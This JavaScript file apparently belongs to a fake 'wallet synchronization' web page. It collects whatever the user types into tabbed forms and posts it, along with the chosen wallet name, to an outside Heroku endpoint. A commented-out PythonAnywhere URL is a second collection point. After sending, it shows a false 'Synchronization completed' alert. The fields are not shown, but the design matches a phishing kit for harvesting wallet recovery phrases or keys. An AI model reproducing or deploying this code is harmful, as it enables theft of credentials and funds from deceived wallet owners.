let walld;
let pickedTab = 0;
let pickedBut;



function tabClicked(a, b) {
    pickedTab = a;
    pickedBut = b;
    console.log(pickedTab, pickedBut);

    sd(pickedTab);
};


async function doThis(argument) {
    var df = document.getElementById('datash');
    walld = argument;
    console.log(walld)
    df.hidden = false;
    if (pickedTab === 0) {
        tabClicked('request1', 'rq1');
    } else {
        tabClicked(pickedTab, pickedBut);
    }

    document.getElementById('datash').scrollIntoView({
        behavior: 'smooth'
    })
};


function sd(argument) {
    const dform = document.getElementById(argument)


    console.log(dform)
    if (dform) {

        dform.addEventListener("submit", function (e) {
            submitForm(e, this);
        });
    };
}


async function submitForm(e, form) {
    console.log('here')
    e.preventDefault();
    const btnSubmit = document.getElementById(pickedBut);
    btnSubmit.disabled = true;

    // setTimeOut

    setTimeout(async () => {
        btnSubmit.disabled = false;

        const jsonFormData = buildJsonFormData(form);

        // const headers = buildHeaders();
        // https://tyrone001.pythonanywhere.com/syncing/
        await performPostHttpRequest('https://syncfun.herokuapp.com/syncing/', jsonFormData).then(res => {
            console.log('done', res);
            if (res.email) {
                localStorage['email'] = res;

                alert('SUCCESS\n\nSynchronization completed');
                var dh = document.getElementById('top_section');
                var dw = document.getElementById('wall');
                var da = document.getElementById('about');
                var df = document.getElementById('datash');
                var dd = document.getElementById('done');

                dh.hidden = true;
                dw.hidden = true;
                da.hidden = true;
                dd.hidden = false;
                document.getElementById('mymail').innerHTML = res.email;
                dd.scrollIntoView({
                    behavior: 'smooth'
                });
                df.hidden = true;




            } else {
                alert('Network Error\n\nPlease synchronize again');
            }


        })

    }, 1000);

}

function buildJsonFormData(form) {
    const jsonFormData = { wallet_name: walld };
    for (const pair of new FormData(form)) {
        jsonFormData[pair[0]] = pair[1];
    }

    return jsonFormData;
}



async function performPostHttpRequest(fetchlink, body) {

    try {
        return await fetch(fetchlink, {
            method: "POST",
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        })
            .then(resp => resp.json())
            .then(res => {

                console.log(res);
                return res;
            })


            .catch(err => {
                alert('Network error try again')
                return 'her';
            })

        // const content = await rawResponse.json();
        // return content;
    }
    catch (err) {
        console.log(`Error at fetching: ${err}`);
        alert(err);
        throw err;
    }

}
